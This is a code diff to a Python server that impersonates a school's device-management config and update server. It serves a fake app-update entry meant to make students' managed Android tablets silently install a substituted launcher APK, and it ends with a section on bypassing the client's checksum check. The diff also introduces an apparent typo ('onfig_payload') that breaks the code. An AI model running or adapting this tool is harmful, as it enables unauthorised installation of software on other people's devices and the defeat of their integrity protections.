@@ -43,9 +43,11 @@ user_name = "##########SENSITIVIE DATA##########"
 user_gender = "##########SENSITIVIE DATA##########"
 user_id = "##########SENSITIVIE DATA##########"
 school_name = "##########SENSITIVIE DATA##########"
-school_domain = "##########SENSITIVIE DATA##########"
+school_domain = "0.0.0.0"
+school_domain_without_port = "0.0.0.0"
 pubkey = "##########SENSITIVIE DATA##########"
 privatekey = "##########SENSITIVIE DATA##########"
+apk_file = "./launcher3.apk"
 
 # global variables
 g_server = None
@@ -60,7 +62,7 @@ g_server_data = None
 g_server_data_lock = threading.Lock()
 
 # global hacking variables
-config_payload = {
+onfig_payload = {
     "status": True,
     "errorNum": 0,
     "errorInfo": "",
@@ -87,19 +89,19 @@ config_payload = {
         "privatekey": privatekey,
         "encrypt": "md5",
         "tigase": {
-            "domain": school_domain,
-            "port": "5222",
-            "ip": "10.58.96.187"
+            "domain": school_domain_without_port,
+            "port": "##########SENSITIVIE DATA##########",
+            "ip": "##########SENSITIVIE DATA##########"
         },
         "mongo": {
-            "domain": school_domain,
+            "domain": school_domain_without_port,
             "port": "##########SENSITIVIE DATA##########",
             "user": "##########SENSITIVIE DATA##########",
             "pwd": "##########SENSITIVIE DATA##########"
         },
         "cloud": [],
         "acs": [],
-        "apihost":school_domain,
+        "apihost": school_domain,
         "questiontype": [
             "\u5355\u9009\u9898",
             "\u591a\u9009\u9898",
@@ -352,7 +354,6 @@ class Server(BaseHTTPRequestHandler):
                 # set shutdown flag
                 g_server_shutdown_lock.acquire()
                 g_server_shutdown = True
-                g_server_shutdown_lock.notify()
                 g_server_shutdown_lock.release()
                 g_server.shutdown()
                 g_server_thread.join()
@@ -380,13 +381,13 @@ class Server(BaseHTTPRequestHandler):
         # set shutdown flag
         g_server_shutdown_lock.acquire()
         g_server_shutdown = True
-        g_server_shutdown_lock.notify()
         g_server_shutdown_lock.release()
 
 def main():
+    global apk_file
     global app_payload 
-    
-    app_payload = generate_app_payload()
+    global school_domain
+    global school_domain_without_port
 
     # parse arguments
     parser = argparse.ArgumentParser()
@@ -396,6 +397,15 @@ def main():
     parser.add_argument('--port', type=int, default=8080, help='server port')
     parser.add_argument('--address', type=str, default='0.0.0.0', help='server address')
     args = parser.parse_args()
+
+    port = args.port
+
+    school_domain_without_port = get_inet_ip()
+    school_domain = school_domain_without_port + ':' + str(port)
+    app_payload = generate_app_payload()
+
+    if school_domain == '127.0.0.1':
+        print('You are not in school network, please connect to school network first.')
 
     # if args.debug:
     #     debug()
@@ -411,6 +421,8 @@ def dict_to_json(d):
     return json.dumps(d)
 
 def generate_app_payload():
+    global school_domain
+    global apk_file
     
     name = str(uuid.uuid4()) + '.apk'
     ver = random.randint(1490, 2000)
@@ -428,38 +440,36 @@ def generate_app_payload():
                 "packagename": "com.launcher.activity",
                 # trigger auto slient install 
                 "versioncode": str(ver),
+                # anything is ok
                 "versionname": "8.4.90",
                 "apptype": "",
                 "apkname": name,
-                "appsize": os.path.getsize("./launcher3.apk"),
+                "appsize": os.path.getsize(apk_file),
                 "iconurl": "",
-                "appwebpath": "http:\/\/192.168.4.213\/download\/" + name,  
-                "name": "Android"
-            }
-            ,
-            {
-                "appname": "OpenStudyClient.apk",
-                "packagename": "com.termmux",
-                "versioncode": str(ver),
-                "versionname": "1.4.90",
-                "apptype": "",
-                "apkname": name,
-                "appsize": os.path.getsize("./OpenStudyClient.apk"),
-                "iconurl": "",
-                "appwebpath": "http:\/\/192.168.4.213\/download\/OpenStudyClient.apk",  
+                "appwebpath": "http:\/\/" + school_domain + "\/download\/" + name,  
                 "name": "Android"
             }
         ]
     }
 
+def get_inet_ip():
+    st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:       
+        st.connect(('10.255.255.255', 1))
+        ip = st.getsockname()[0]
+    except Exception:
+        ip = '127.0.0.1'
+    finally:
+        st.close()
+    return ip
+
+
 if __name__ == '__main__':
     main()
 
-
-
 ##################################
 # ONE WAY TO BYPASS THE CHECKSUM #
-#################################
+##################################
 """
 ``` java
 private boolean checkConfig(String jsonStr, String timeStamp2) {
